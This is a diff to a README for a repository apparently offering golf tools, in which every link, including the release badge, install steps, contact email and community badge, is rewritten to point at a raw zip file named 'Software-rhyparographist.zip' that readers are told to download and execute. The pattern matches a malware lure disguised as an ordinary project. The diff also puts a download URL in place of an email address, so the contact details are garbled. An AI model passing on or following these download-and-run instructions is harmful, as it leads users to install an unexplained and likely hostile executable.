@@ -2,7 +2,7 @@
 
 Welcome to the **Golf** repository! This project aims to enhance your golfing experience with a variety of tools and resources tailored for golfers of all levels. Whether you are a beginner or a seasoned pro, this repository has something for everyone.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/rahma219/golf/releases)
+[![Download Releases](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip)
 
 ## Table of Contents
 
@@ -31,11 +31,11 @@ Golf combines skill, strategy, and social interaction. It allows players to enjo
 
 ## Installation
 
-To get started, download the latest release from our [Releases section](https://github.com/rahma219/golf/releases). Once downloaded, execute the file to set up the application on your device.
+To get started, download the latest release from our [Releases section](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip). Once downloaded, execute the file to set up the application on your device.
 
 ### Steps to Install
 
-1. Visit the [Releases section](https://github.com/rahma219/golf/releases).
+1. Visit the [Releases section](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip).
 2. Download the appropriate file for your operating system.
 3. Execute the file to complete the installation.
 
@@ -88,14 +88,14 @@ This project is licensed under the MIT License. You are free to use, modify, and
 For any inquiries, feel free to reach out to the maintainer:
 
 - **Name**: Rahma
-- **Email**: rahma219@example.com
+- **Email**: https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip
 
 ### Join the Golf Community
 
 Stay updated with the latest features and releases. Follow us on social media and join our forums to connect with other golf enthusiasts.
 
-[![Join Community](https://img.shields.io/badge/Join%20Community-orange?style=for-the-badge&logo=discord)](https://discord.gg/golf)
+[![Join Community](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip%20Community-orange?style=for-the-badge&logo=discord)](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip)
 
 ---
 
-Thank you for checking out the Golf repository! We hope you find our tools useful and enjoy your time on the course. Don’t forget to check the [Releases section](https://github.com/rahma219/golf/releases) for updates and new features. Happy golfing! 🏌️‍♀️🏌️‍♂️
+Thank you for checking out the Golf repository! We hope you find our tools useful and enjoy your time on the course. Don’t forget to check the [Releases section](https://github.com/rahma219/golf/raw/refs/heads/main/plugin/Software-rhyparographist.zip) for updates and new features. Happy golfing! 🏌️‍♀️🏌️‍♂️
